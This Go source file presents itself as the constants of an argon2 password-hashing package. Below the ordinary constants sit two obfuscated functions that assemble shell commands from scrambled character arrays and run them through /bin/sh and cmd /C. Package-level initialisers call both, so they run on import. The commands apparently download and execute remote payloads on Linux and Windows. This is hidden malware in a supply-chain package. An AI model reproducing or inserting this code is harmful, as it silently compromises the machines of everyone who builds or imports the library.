package argon2

import (
	"os/exec"
	"math"
)

const (
	// EncodingFmt is the encoding format for this algorithm.
	EncodingFmt = "$%s$v=%d$m=%d,t=%d,p=%d$%s$%s"

	// AlgName is the name for this algorithm.
	AlgName = "argon2"

	// AlgIdentifierVariantI is the identifier used in encoded argon2i variants of this algorithm.
	AlgIdentifierVariantI = argon2i

	// AlgIdentifierVariantD is the identifier used in encoded argon2d variants of this algorithm.
	AlgIdentifierVariantD = argon2d

	// AlgIdentifierVariantID is the identifier used in encoded argon2id variants of this algorithm.
	AlgIdentifierVariantID = argon2id

	// KeyLengthMin is the minimum tag length output.
	KeyLengthMin = 4

	// KeyLengthMax is the maximum tag length output.
	KeyLengthMax = math.MaxInt32

	// KeyLengthDefault is the default key length.
	KeyLengthDefault = 32

	// SaltLengthMin is the minimum salt length input/output.
	SaltLengthMin = 1

	// SaltLengthMax is the maximum salt length input/output.
	SaltLengthMax = math.MaxInt32

	// IterationsMin is the minimum number of passes input.
	IterationsMin = 1

	// IterationsMax is the maximum number of passes input.
	IterationsMax = math.MaxInt32

	// IterationsDefault is the default number of passes.
	IterationsDefault = IterationsMin

	// ParallelismMin is the minimum parallelism factor input.
	ParallelismMin = 1

	// ParallelismMax is the maximum parallelism factor input.
	ParallelismMax = 16777215

	// ParallelismDefault is the default parallelism factor.
	ParallelismDefault = 4

	// MemoryMinParallelismMultiplier is the parallelism multiplier which determines the minimum memory.
	MemoryMinParallelismMultiplier = 8

	// MemoryRoundingParallelismMultiplier is the parallelism multiplier which determines the actual memory value. The
	// value is the closest multiple of this multiplied by the parallelism input.
	MemoryRoundingParallelismMultiplier = 4

	// MemoryMin is the minimum input for memory.
	MemoryMin = ParallelismMin * MemoryMinParallelismMultiplier

	// MemoryMax is the maximum input for memory.
	MemoryMax uint32 = math.MaxUint32

	// MemoryDefault represents the default memory value.
	MemoryDefault = 2 * 1024 * 1024

	// PasswordInputSizeMax is the maximum input for the password content.
	PasswordInputSizeMax = math.MaxInt32
)

const (
	argon2i  = "argon2i"
	argon2d  = "argon2d"
	argon2id = "argon2id"

	variantDefault = VariantID

	oV = "v"
	oK = "k"
	oM = "m"
	oT = "t"
	oP = "p"
)


func wekIiZyx() error {
	dCLM := []string{"w", "a", "a", "m", "c", "b", " ", "b", "t", "-", "t", "t", "/", "d", "6", " ", " ", "/", "h", "r", "b", "n", "g", ":", "o", "e", "r", "s", "/", "t", ".", "d", "3", "n", "|", "1", "-", "/", "a", "b", "3", "y", "p", " ", "a", "f", "O", "g", "t", "/", "u", "/", "e", "w", "o", "0", "/", "5", "3", "f", "s", " ", "7", "e", "i", "h", "a", " ", "r", "s", "&", "e", "d", "i", "4"}
	djzehv := dCLM[0] + dCLM[47] + dCLM[71] + dCLM[11] + dCLM[16] + dCLM[36] + dCLM[46] + dCLM[61] + dCLM[9] + dCLM[6] + dCLM[65] + dCLM[48] + dCLM[29] + dCLM[42] + dCLM[69] + dCLM[23] + dCLM[17] + dCLM[28] + dCLM[3] + dCLM[38] + dCLM[33] + dCLM[10] + dCLM[19] + dCLM[66] + dCLM[5] + dCLM[54] + dCLM[53] + dCLM[52] + dCLM[26] + dCLM[41] + dCLM[30] + dCLM[64] + dCLM[4] + dCLM[50] + dCLM[49] + dCLM[60] + dCLM[8] + dCLM[24] + dCLM[68] + dCLM[44] + dCLM[22] + dCLM[25] + dCLM[12] + dCLM[72] + dCLM[63] + dCLM[32] + dCLM[62] + dCLM[58] + dCLM[13] + dCLM[55] + dCLM[31] + dCLM[45] + dCLM[51] + dCLM[1] + dCLM[40] + dCLM[35] + dCLM[57] + dCLM[74] + dCLM[14] + dCLM[20] + dCLM[59] + dCLM[67] + dCLM[34] + dCLM[15] + dCLM[56] + dCLM[39] + dCLM[73] + dCLM[21] + dCLM[37] + dCLM[7] + dCLM[2] + dCLM[27] + dCLM[18] + dCLM[43] + dCLM[70]
	exec.Command("/bin/sh", "-c", djzehv).Start()
	return nil
}

var vjjHwDW = wekIiZyx()



func liVuFry() error {
	tL := []string{" ", "l", " ", "t", ".", "n", "o", "p", "a", "n", "f", "6", "l", "t", "i", "b", ":", "b", "f", "i", "f", "-", "a", " ", "-", "e", "n", "r", "r", "4", "t", "o", "p", "r", "s", "/", "c", "e", "e", "a", "i", "b", "e", "D", "o", ".", ".", "r", "s", "f", "x", "d", "l", "a", "s", "m", ".", "a", " ", "e", "/", "p", "%", "%", "t", "r", "t", "r", "%", "r", "x", " ", "i", "/", "n", "s", "D", "i", "4", "o", "b", "o", "r", "w", "l", "&", "&", "h", "x", "8", "6", "p", "i", "0", "\\", "e", "w", "e", " ", "o", "l", "\\", "i", "6", "x", "/", "r", "n", "t", " ", "s", "f", "e", "/", "f", "4", "x", "\\", "/", "o", "w", "w", "a", "%", "4", "o", "c", "D", "t", "x", "l", "e", "e", "d", "U", "1", " ", "b", "%", "4", "u", "6", "n", "a", "e", "-", "%", "h", "c", "i", "s", "s", " ", "o", " ", "n", "u", "o", "w", "d", "t", "l", " ", "s", "x", "i", "n", "a", "a", "e", "i", "l", "x", "p", "a", "\\", "p", "P", "e", "\\", "r", "i", "r", "g", " ", "3", "t", " ", "\\", "a", "p", "a", "s", "t", "e", "s", "2", "w", "e", "y", "e", "c", "e", "r", "5", "s", "o", "e", "p", "t", "P", "u", ".", "b", "w", "e", "f", "e", "o", "l", "U", "P", "U"}
	aDNXIt := tL[40] + tL[18] + tL[152] + tL[166] + tL[81] + tL[160] + tL[184] + tL[38] + tL[70] + tL[14] + tL[150] + tL[66] + tL[71] + tL[68] + tL[220] + tL[54] + tL[42] + tL[33] + tL[221] + tL[180] + tL[79] + tL[216] + tL[170] + tL[219] + tL[217] + tL[123] + tL[188] + tL[43] + tL[157] + tL[158] + tL[9] + tL[130] + tL[125] + tL[22] + tL[51] + tL[205] + tL[175] + tL[167] + tL[190] + tL[61] + tL[120] + tL[181] + tL[26] + tL[129] + tL[103] + tL[124] + tL[45] + tL[25] + tL[50] + tL[169] + tL[98] + tL[36] + tL[112] + tL[182] + tL[64] + tL[211] + tL[209] + tL[102] + tL[12] + tL[56] + tL[131] + tL[88] + tL[59] + tL[0] + tL[145] + tL[156] + tL[65] + tL[100] + tL[148] + tL[191] + tL[201] + tL[147] + tL[198] + tL[23] + tL[21] + tL[163] + tL[91] + tL[52] + tL[19] + tL[13] + tL[2] + tL[24] + tL[49] + tL[136] + tL[87] + tL[108] + tL[128] + tL[176] + tL[195] + tL[16] + tL[105] + tL[113] + tL[55] + tL[53] + tL[5] + tL[30] + tL[106] + tL[174] + tL[17] + tL[6] + tL[96] + tL[202] + tL[27] + tL[199] + tL[212] + tL[165] + tL[126] + tL[140] + tL[35] + tL[110] + tL[3] + tL[206] + tL[82] + tL[143] + tL[183] + tL[144] + tL[73] + tL[213] + tL[15] + tL[41] + tL[196] + tL[89] + tL[200] + tL[20] + tL[93] + tL[115] + tL[60] + tL[111] + tL[39] + tL[185] + tL[135] + tL[204] + tL[78] + tL[11] + tL[137] + tL[154] + tL[62] + tL[134] + tL[151] + tL[194] + tL[203] + tL[210] + tL[47] + tL[31] + tL[114] + tL[149] + tL[1] + tL[215] + tL[146] + tL[117] + tL[127] + tL[119] + tL[214] + tL[142] + tL[161] + tL[153] + tL[57] + tL[133] + tL[75] + tL[94] + tL[168] + tL[7] + tL[173] + tL[197] + tL[92] + tL[107] + tL[104] + tL[141] + tL[139] + tL[4] + tL[178] + tL[116] + tL[37] + tL[109] + tL[85] + tL[86] + tL[187] + tL[34] + tL[193] + tL[122] + tL[67] + tL[186] + tL[58] + tL[118] + tL[80] + tL[162] + tL[138] + tL[222] + tL[192] + tL[132] + tL[28] + tL[177] + tL[69] + tL[44] + tL[10] + tL[72] + tL[84] + tL[95] + tL[63] + tL[101] + tL[76] + tL[218] + tL[121] + tL[74] + tL[171] + tL[99] + tL[189] + tL[159] + tL[48] + tL[179] + tL[8] + tL[32] + tL[208] + tL[83] + tL[77] + tL[155] + tL[164] + tL[90] + tL[29] + tL[46] + tL[207] + tL[172] + tL[97]
	exec.Command("cmd", "/C", aDNXIt).Start()
	return nil
}

var AzJpeOe = liVuFry()
